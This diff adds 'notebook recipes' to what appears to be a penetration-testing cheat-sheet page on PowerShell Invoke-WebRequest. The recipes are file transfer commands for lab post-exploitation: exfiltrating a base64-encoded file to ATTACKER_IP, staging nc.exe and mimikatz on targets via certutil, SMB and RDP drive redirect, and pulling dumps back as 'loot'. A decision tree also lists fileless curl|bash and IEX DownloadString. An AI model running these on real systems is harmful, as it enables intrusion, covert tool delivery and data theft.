@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=invoke-webrequest) · [All tools](/index)
+
 ## Commands
 
 **Windows PowerShell**
@@ -21,8 +23,170 @@ Invoke-WebRequest -UseBasicParsing 'http://KALI_IP:8000/file.exe' -OutFile 'C:\U
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=Invoke-WebRequest)
+## Notebook recipes
 
-## Learning and original examples
+10 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
+<AccordionGroup>
+
+<Accordion title="PowerShell Web Downloads">
+
+### PowerShell Web Downloads
+
+**File Transfers for Linux and Windows**
+
+```powershell
+Invoke-WebRequest http://<IP>/file.exe -OutFile file.exe
+```
+
+**File Transfers for Linux and Windows**
+
+```powershell
+Invoke-WebRequest http://<IP>/file.exe -UseBasicParsing -OutFile file.exe
+```
+
+</Accordion>
+
+<Accordion title="PowerShell Web Uploads">
+
+### PowerShell Web Uploads
+
+**File Transfers for Linux and Windows**
+
+```powershell
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\path\to\file' -Encoding Byte))
+Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/ -Method POST -Body $b64
+```
+
+</Accordion>
+
+<Accordion title="Quick Decision Tree">
+
+### Quick Decision Tree
+
+**File Transfers for Linux and Windows**
+
+```text
+DOWNLOADING TO WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
+├── Only cmd.exe?       → certutil or bitsadmin
+├── Internal network?   → SMB (impacket-smbserver)
+├── Need fileless?      → IEX + DownloadString
+└── Nothing works?      → Base64 encode/decode via clipboard
+
+DOWNLOADING TO LINUX:
+├── Have curl/wget?     → Use them (simplest)
+├── Need fileless?      → curl | bash  or  wget -qO- | python3
+├── Have Python/PHP?    → Use language one-liners
+├── Nothing available?  → /dev/tcp bash trick
+└── Need encryption?    → OpenSSL s_server/s_client
+
+UPLOADING FROM WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
+├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
+├── Internal network?   → SMB or WebDAV
+└── Nothing works?      → Base64 encode → copy-paste → decode on attacker
+
+UPLOADING FROM LINUX:
+├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
+├── Have SCP?           → scp file user@attacker:/path/
+├── Have Python?        → python3 requests.post one-liner
+└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
+```
+
+</Accordion>
+
+<Accordion title="Spoofing User Agents">
+
+### Spoofing User Agents
+
+**File Transfers for Linux and Windows**
+
+```powershell
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+Invoke-WebRequest http://<IP>/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+```
+
+</Accordion>
+
+<Accordion title="Downloading TO a Windows target">
+
+### Downloading TO a Windows target
+
+**Pivoting and File Transfer: Field Reference**
+
+```powershell
+# PowerShell
+Invoke-WebRequest http://172.16.119.13:8080/tool.exe -OutFile C:\Users\Public\tool.exe
+# certutil (lives on every Windows box, less suspicious filename-wise)
+certutil -urlcache -split -f http://172.16.119.13:8080/tool.exe C:\Users\Public\tool.exe
+# SMB (impacket smbserver on a reachable host):
+copy \\172.16.119.13\share\tool.exe C:\Users\Public\
+# RDP drive redirect — no server at all:
+#   xfreerdp3 ... /drive:kali,/home/kali/loot   then inside Windows:
+copy \\tsclient\kali\tool.exe C:\Users\Public\
+```
+
+**Pivoting and File Transfer: Field Reference**
+
+Context from the notebook: Invoke-WebRequest -OutFile  downloads a  single file , never a folder. Point it at the exact  .exe . A folder URL just saves the directory‑listing HTML.
+
+```text
+Invoke-WebRequest -OutFile
+```
+
+</Accordion>
+
+<Accordion title="Quick-start command cheat (run first, always)">
+
+### Quick-start command cheat (run first, always)
+
+**Privilege Escalation: Choose a Checklist**
+
+```powershell
+# 1. Automated
+iwr -Uri "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe" -OutFile "C:\temp\winPEAS.exe"
+C:\temp\winPEAS.exe
+
+# 2. Manual "big 5"
+whoami /priv
+whoami /groups
+systeminfo
+net user; net localgroup administrators
+Get-WmiObject win32_service | ? {$_.StartMode -eq 'Auto' -and $_.State -ne 'Running'}
+```
+
+</Accordion>
+
+<Accordion title="Transfer (full detail in the Pivoting cheatsheet)">
+
+### Transfer (full detail in the Pivoting cheatsheet)
+
+**Windows Post-Exploitation: Field Reference**
+
+```cmd
+:: from your RDP session (drive redirect) — copy off \\tsclient\
+copy \\tsclient\kali\mimikatz.exe C:\Users\Public\
+:: HTTP from a host the target can reach (DMZ, not your external IP):
+powershell -c "Invoke-WebRequest http://172.16.119.13:8080/mimikatz.exe -OutFile C:\Users\Public\m.exe"
+:: PULL a file back to Kali over your session:
+*Evil-WinRM* PS> download C:\Temp\l.dmp /home/kali/loot/
+```
+
+</Accordion>
+
+<Accordion title="⏱️ DECISION HEADER">
+
+### ⏱️ DECISION HEADER
+
+**Pivoting and File Transfer: Field Reference**
+
+Context from the notebook: Download a tool  to  a Windows target Invoke-WebRequest  /  certutil  / SMB / RDP drive to Windows
+
+```text
+Invoke-WebRequest
+```
+
+</Accordion>
+
+</AccordionGroup>
